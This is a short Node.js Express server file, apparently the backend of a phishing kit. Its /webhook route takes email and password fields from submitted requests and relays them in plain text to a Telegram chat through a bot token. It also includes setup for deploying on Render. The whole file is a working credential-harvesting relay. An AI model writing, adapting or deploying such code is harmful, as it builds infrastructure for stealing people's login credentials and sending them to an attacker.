const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(bodyParser.json());

// Load credentials from Render Environment Variables
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

// Initialize Telegram bot without polling
const bot = new TelegramBot(botToken);

// Webhook route — this receives POST requests
app.post('/webhook', async (req, res) => {
  const { email, password } = req.body;

  const message = `📩 New Submission:\n\nEmail: ${email}\npassword: ${password}`;

  try {
    await bot.sendMessage(chatId, message);
    res.status(200).send('✅ Data received and sent to Telegram');
  } catch (error) {
    console.error('Error sending message:', error);
    res.status(500).send('❌ Error sending data');
  }
});

// Optional route to check if the server is running
app.get('/', (req, res) => {
  res.send('🚀 Webhook server is live!');
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);

  // Optional: set webhook automatically
  const webhookUrl = `https://your-render-app-name.onrender.com/webhook`;
  bot.setWebHook(webhookUrl);
  console.log(`🌐 Webhook set to: ${webhookUrl}`);
});
